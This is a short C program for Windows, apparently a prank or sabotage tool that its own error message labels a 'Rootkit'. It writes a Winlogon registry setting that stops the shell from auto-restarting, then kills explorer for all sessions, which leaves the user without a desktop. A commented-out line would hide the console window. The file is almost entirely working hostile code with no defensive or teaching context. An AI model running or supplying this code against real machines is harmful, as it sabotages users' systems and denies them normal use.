#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <unistd.h>

int run_command(STARTUPINFO* si, PROCESS_INFORMATION* pi, char* command) {
    if (!CreateProcess(NULL,   // No module name (use command line)
        ((LPSTR) command),        // file to run
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        si,            // Pointer to STARTUPINFO structure
        pi)           // Pointer to PROCESS_INFORMATION structure
    )
    {
        int error = GetLastError();
        printf("Rootkit failed (%d).\n", error);
        return error;
    }
    return 0;
}

int main( )
{
	// ::ShowWindow(::GetConsoleWindow(), SW_HIDE); 
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );    

    char command_KillExplorer[] = "tskill /A explorer";
    char command_StopShellRestart[] = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /t REG_DWORD /V \"AutoRestartShell\" /d 0 /f";

    run_command(&si, &pi, command_StopShellRestart);
    run_command(&si, &pi, command_KillExplorer);



    // Wait until child process exits.
    WaitForSingleObject( pi.hProcess, INFINITE );

    // Close process and thread handles. 
    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );
    return 0;
}
